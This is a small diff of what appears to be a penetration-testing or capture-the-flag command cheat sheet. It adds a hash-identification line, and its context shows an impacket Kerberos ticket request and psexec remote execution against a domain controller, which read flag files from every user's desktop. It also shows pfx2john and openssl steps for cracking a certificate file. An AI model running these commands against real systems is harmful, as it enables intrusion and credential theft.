@@ -635,6 +635,9 @@ gpupdate /force
 impacket-getTGT -dc-ip $TARGET $DOM/'myadmin':'123qweasdF!'; kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
 
 [*] Cracking
++---------- Identify ----------+
+haiti cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
+
 +---------- PFX ----------+
 pfx2john auth.pfx
 openssl pkcs12 -in auth.pfx -nocerts -out auth.key-enc
